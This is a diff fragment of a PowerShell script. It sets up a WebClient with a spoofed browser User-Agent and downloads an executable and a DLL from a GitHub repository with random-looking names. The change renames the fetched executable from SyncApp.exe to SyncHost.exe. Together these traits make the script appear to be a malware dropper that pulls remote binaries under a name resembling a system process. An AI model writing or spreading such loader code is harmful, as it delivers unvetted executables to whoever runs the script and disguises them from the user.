@@ -25,7 +25,7 @@ $v = New-Object Net.WebClient
 $v.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
 
 # URLs (User must update these)
-$d1 = "https://github.com/cusXD/ADVBGHSAIYiasuihduiAJKH/releases/download/ADLKAHHahsdhhbCAHUJhlvHA/SyncApp.exe"
+$d1 = "https://github.com/cusXD/ADVBGHSAIYiasuihduiAJKH/releases/download/ADLKAHHahsdhhbCAHUJhlvHA/SyncHost.exe"
 $d2 = "https://github.com/cusXD/ADVBGHSAIYiasuihduiAJKH/raw/refs/heads/main/e_sqlite3.dll"
 
 $e1 = Join-Path $b1 $c1
